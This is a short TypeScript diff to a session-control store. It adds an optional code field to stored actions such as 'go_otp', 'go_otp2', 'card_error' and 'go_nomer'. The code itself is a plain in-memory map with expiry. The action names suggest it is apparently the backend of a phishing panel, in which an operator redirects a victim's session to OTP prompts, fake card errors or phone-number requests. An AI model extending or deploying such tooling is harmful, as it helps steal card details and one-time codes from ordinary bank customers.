@@ -2,6 +2,7 @@ export type ControlAction = "go_otp" | "go_otp2" | "card_error" | "go_nomer" | "
 
 interface ControlEntry {
   action: ControlAction;
+  code?: string;
   setAt: number;
 }
 
@@ -17,11 +18,11 @@ function cleanup() {
 }
 setInterval(cleanup, 5 * 60 * 1000);
 
-export function setControl(sessionId: string, action: ControlAction): void {
-  store.set(sessionId, { action, setAt: Date.now() });
+export function setControl(sessionId: string, action: ControlAction, code?: string): void {
+  store.set(sessionId, { action, code, setAt: Date.now() });
 }
 
-export function getControl(sessionId: string): ControlAction | null {
+export function getControl(sessionId: string): { action: ControlAction; code?: string } | null {
   const entry = store.get(sessionId);
   if (!entry) return null;
   if (Date.now() - entry.setAt > TTL_MS) {
@@ -29,11 +30,11 @@ export function getControl(sessionId: string): ControlAction | null {
     return null;
   }
   store.delete(sessionId);
-  return entry.action;
+  return { action: entry.action, code: entry.code };
 }
 
-export function peekControl(sessionId: string): ControlAction | null {
+export function peekControl(sessionId: string): { action: ControlAction; code?: string } | null {
   const entry = store.get(sessionId);
   if (!entry) return null;
-  return entry.action;
+  return { action: entry.action, code: entry.code };
 }
